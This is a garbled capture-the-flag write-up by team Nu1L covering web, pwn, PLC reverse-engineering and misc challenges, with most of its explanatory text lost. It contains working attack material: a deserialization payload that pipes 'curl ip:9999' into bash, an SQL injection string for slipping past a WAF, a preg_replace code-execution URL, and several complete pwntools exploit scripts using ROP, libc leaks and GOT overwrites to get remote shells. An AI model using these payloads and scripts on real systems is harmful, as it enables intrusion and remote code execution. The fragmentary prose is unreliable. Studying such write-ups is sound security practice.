-Writeup
Nu1L
WEB
idid=2333ﬂag
ssrf+sqli
fuzzsecertdownload.phpssrf
insertpayload:
gitpayload:
O:7:"Record":3:{s:4:"ﬁle";s:19:" curl ip:9999|bash ";}
$ad 
sqlmap
ﬂag
.index.php.swn upload.php unzip.sh .
zipgetshell
pregpayload
http://47.104.74.209:20005/index.php?pat=/test/e&rep=system('ls -la')&sub=jutst
test
id  1%009 linux 1.php/. 
getshellbackup../
YUN_WAF
...aliyunwaf…like
veneno' or 1 and password like 'xxxx' limit 1#
YUN_WAF
form-data
YUN_WAF
post..
curlechoshellﬂag
Pwn
pwn
12. 0x804b14c0x2223322
payloadﬂag
HMI
2
alarmSIGALRMhandlerROP
alarm
libcDynELFleakenvp
systemget shellmprotect+shellcode
fmtstr_payload(12, {0x804b14c: 0x2223322})
flag{1hasdfw423fgv45432wgasv45443v120bjsdf}
from pwn import *
cnt = 0x88 + 4
#context(log_level='debug')
elf = ELF('./stack')
#p = process('./stack')
p = remote('47.104.188.176', 30004)
rop = ROP(elf)
rop.alarm(0x1000)
rop.write(1, elf.got['read'], 4)
rop.gee()
p.recvuntil('Init')
p.sendline(cnt * 'A' + rop.chain())
p.recvuntil('*...........................................................\n
')
p.recvuntil('*...........................................................\n
')
p.recvuntil('*...........................................................\n
')
p.recvuntil('*...........................................................\n
')
read_addr = u32(p.recv(4))
print hex(read_addr)
def leak(addr):
rop = ROP(elf)
rop.write(1, addr, 4)
rop.gee()
p.sendline(cnt * 'A' + rop.chain())
p.recvuntil('*...........................................................\n
')
data = p.recv(4) 
print '%x => %s' % (addr, data or '')
return data
d = DynELF(leak, elf = ELF('./stack'))
mprotect_addr = d.lookup('mprotect', 'libc')
print hex(mprotect_addr)
shellcode = shellcraft.i386.linux.sh()
rop = ROP(elf)
rop.call(mprotect_addr, arguments=(0x8048000, 4096, 7,))
rop.gee()
p.sendline(cnt * 'A' + rop.chain())
p.recvuntil('*...........................................................\n
')
rop = ROP(elf)
mmap
rop.read(0, 0x8048000, 1024)
rop.call(0x8048000)
p.sendline((cnt) * 'A' + rop.chain())
p.sendline(asm(shellcode))
p.interactive()
flag{234dg5g5h5h5hy2h2h234rg34g34grg3}
from pwn import *
import roputils
import time
LOCAL = 0
DEBUG = 0
VERBOSE = 1
context.arch = 'i386'
if VERBOSE:
context.log_level = 'debug'
if LOCAL:
io = process('./play')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if DEBUG:
gdb.attach(io, 'b *0x08048F02\n')
else:
io = remote('47.104.90.157', 30003)
libc = ELF('/home/bird/ctf/libc-database/db/libc6-i386_2.23-
0ubuntu9_amd64.so')
def hacking(yes_or_no):
io.recvuntil('choice>> ')
io.sendline('1')
io.recvuntil('use hiden_methods?(1:yes/0:no):')
io.sendline(str(yes_or_no))
def change_host():
io.recvuntil('choice>> ')
io.sendline('2')
def change_methods(idx):
io.recvuntil('choice>> ')
io.sendline('3')
io.recvuntil('choice>> ')
io.sendline(str(idx))
def attack():
for i in range(4):
if LOCAL:
io2 = process('./play')
else:
io2 = remote('47.104.90.157', 30003)
name = 'B1rd'
io2.recvuntil('login:')
io2.sendline(name)
io2.recvuntil('choice>> ')
io2.close()
hacking(1)
def attack2():
name = 'B1rd'
io.recvuntil('login:')
io.sendline(name)
change_methods(1)
# level 0
hacking(1)
hacking(1)
# level 1
hacking(1)
hacking(1)
hacking(1)
# level 2
hacking(1)
hacking(1)
hacking(1)
hacking(1)
change_host()
hacking(1)
hacking(1)
change_host()
change_host()
hacking(1)
change_host()
change_host()
change_host()
change_host()
    hacking(1)
 /proc/self/maps  /proc/self/mem 
# level 3
for i in range(14):
attack()
change_host()
for i in range(3):
if LOCAL:
io2 = process('./play')
else:
io2 = remote('47.104.90.157', 30003)
name = 'B1rd'
io2.recvuntil('login:')
io2.sendline(name)
io2.recvuntil('choice>> ')
io2.close()
hacking(1)
attack2()
io.recvuntil('what\'s your name:')
elf = ELF('./play')
io.sendline('A' * 0x4c + p32(elf.plt['write']) + p32(0x80492C0) + p32(1) + 
p32(elf.got['read']) + p32(4))
io.recvuntil('\n')
libc_addr = u32(io.recvn(4)) - libc.symbols['read']
log.info('libc_addr:%#x' % libc_addr)
system_addr = libc_addr + libc.symbols['system']
bin_sh = libc_addr + next(libc.search('/bin/sh'))
log.info('system_addr:%#x' % system_addr)
log.info('bin_sh:%#x' % bin_sh)
attack2()
io.recvuntil('what\'s your name:')
io.sendline('A' * 0x4c + p32(system_addr) + p32(0) + p32(bin_sh))
io.recv()
io.interactive()
# -*- coding: UTF-8 -*-
from pwn import *
LOCAL = 0
DEBUG = 1
VERBOSE = 1
if VERBOSE:
context.log_level = 'debug'
if LOCAL:
io = process('./fileManager', aslr=False, env={'LD_PRELOAD': 
'./libc.so.6'})
libc = ELF('./libc.so.6')
if DEBUG:
gdb.attach(io, 'b *0x56555F2C\n')
else:
io = remote('47.104.188.138', 30007)
libc = ELF('./libc.so.6')
def read_mod(name, offset, size):
io.recvuntil('\x87\xba\n')
io.sendline('1')
io.recvuntil('\xa7\xb0\x3a')
io.sendline(name)
io.recvuntil('\x87\x8f\x3a')
io.sendline(str(offset))
io.recvuntil('\xb0\x8f\x3a')
io.sendline(str(size))
io.recvuntil('\xae\xb9')
def write_mod(name, offset, size, content):
io.recvuntil('\x87\xba\n')
io.sendline('2')
io.recvuntil('\xa7\xb0\x3a')
io.sendline(name)
io.recvuntil('\x87\x8f\x3a')
io.sendline(str(offset))
io.recvuntil('\xb0\x8f\x3a')
io.sendline(str(size))
io.recvuntil('\x9d\x97\x3a')
io.send(content)
name = 'B1rd'
io.recvuntil('FTP:')
io.sendline(name)
read_mod('/proc/self/maps', 0, 0x100)
elf_base = int(io.recvn(8), 16)
log.info('elf_base:%#x' % elf_base)
elf = ELF('fileManager')
read_mod('/proc/self/mem', elf_base + elf.got['open'], 0x100)
libc_addr = u32(io.recvn(4)) - libc.symbols['open']
system_addr = libc_addr + libc.symbols['system']
log.info('libc_addr:%#x' % libc_addr)
log.info('system_addr:%#x' % system_addr)
Re
PLC
 = =
sleep_ms10shell
write_mod('/proc/self/mem', elf_base + elf.got['open'], 5, 
p32(system_addr))
io.recvuntil('\x87\xba\n')
io.sendline('2')
io.recvuntil('\xa7\xb0\x3a')
io.sendline('/bin/sh')
io.interactive()
#include 
using namespace std;
int f(int x, int y)
{
int a = 2544 / x;
int b = 2544 / x / y;
int i, j;
int sum = 0;
for (i = 0; i  0; --j)
{
sum += x;
}
}
return sum;
}
int main()
{
int max = 0;
int i, j;
for (i = 1; i  max - 200)
{
printf("%d %d %d\n", i, j, f(j, i));
max = f(j, i);
}
}
}
return 0;
}
flag{kfasdgg3g56h6h6jkga54jkgsj6j23}
192.168.138.132-->47.104.188.199
0000000000067e039bca0001
47.104.188.199-->192.168.138.132
0000000000057e0302a397
192.168.138.132-->47.104.188.199
0001000000067e0327d20001
47.104.188.199-->192.168.138.132
0001000000057e0302a255
192.168.138.132-->47.104.188.199
0002000000067e0343430001
47.104.188.199-->192.168.138.132
0002000000057e030253be
192.168.138.132-->47.104.188.199
0003000000067e03a0720001
47.104.188.199-->192.168.138.132
0003000000057e0302f1fc
192.168.138.132-->47.104.188.199
0004000000067e03009a0001
47.104.188.199-->192.168.138.132
0004000000057e03020032
...
192.168.138.132UI0x7e+0x9a147.104.188.199
“”
ﬂag: flag{booomoXxb00mBBAmBoom00Xxxx}
PLCbin
 https://github.com/ameng929/NOE77101_Firmware/tree/master/FLASH0/wwwroot/conf
/exec  http://mp.weixin.qq.com/s?
__biz=MzA5OTMwMzY1NQ==&mid=207094710&idx=1&sn=13fc594d15729bd7e001a48b90d827c4&s
cene=4%23wechat_redirect binbinWinHex
7bytes
ida
...
192.168.138.132-->47.104.188.199
0004000000067e03009a0001
47.104.188.199-->192.168.138.132
0004000000057e03020032
...
192.168.138.132-->47.104.188.199
0022000000067e03009a0001
47.104.188.199-->192.168.138.132
0022000000057e03020033
...
192.168.138.132-->47.104.188.199
0045000000067e03009a0001
47.104.188.199-->192.168.138.132
0045000000057e03020034
...
192.168.138.132-->47.104.188.199
0063000000067e03009a0001
47.104.188.199-->192.168.138.132
0063000000057e03020035
...
0000000000067e10009a000102ffff
booomoXxb00mBBAmBoom00Xxxx
1AC0F3: 02
01
1AC0F8: 3B
7D
1AC0F9: C9
3E
1AC0FA: FF
4B
1AC0FB: FF
78
1AC14F: 35
36
1AC16B: 41
42
VxEncrypt
 https://github.com/ilovepp/z3_loginDefaultEncrypt py
Misc
16docxrreq uuidtagjpxjpeg2000
smarNCGw10
wPhotoshoptext(3ijnhygvfr)Hﬂag3Whex:3377